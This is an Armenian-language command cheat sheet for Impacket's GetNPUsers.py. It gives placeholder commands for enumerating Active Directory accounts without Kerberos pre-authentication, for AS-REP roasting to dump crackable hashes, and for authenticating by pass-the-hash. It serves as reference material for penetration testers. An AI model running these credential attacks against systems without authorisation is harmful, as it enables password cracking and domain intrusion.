# GetNPUsers.py

> Թվարկեք Active Directory հաշիվները, որոնցում Kerberos-ի նախնական նույնականացումն անջատված է, որոնք կարող են ենթարկվել AS-REP-ի հարձակման:.
> Impacket փաթեթի մի մասը:.
> Լրացուցիչ տեղեկություններ. <https://github.com/fortra/impacket>:.

- Թվարկեք Kerberos-ի նախնական վավերացումն անջատված օգտվողներին (կանխադրված անանուն թվարկում).:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -no-pass`

- Կատարեք AS-REP բովում և թափեք կոտրվող հեշեր անցանց կոտրման համար.:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -no-pass -request`

- Նույնականացրեք վավեր հավատարմագրերով (եթե անանուն պարտադիր կապն անջատված է).:

`GetNPUsers.py {{domain}}/{{username}}:{{password}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Գաղտնաբառի փոխարեն օգտագործեք «pas-the-hash» վավերացում.:

`GetNPUsers.py {{domain}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Պահպանեք արդյունքը ֆայլում հետագա վերլուծության համար.:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request > {{path/to/output.txt}}`
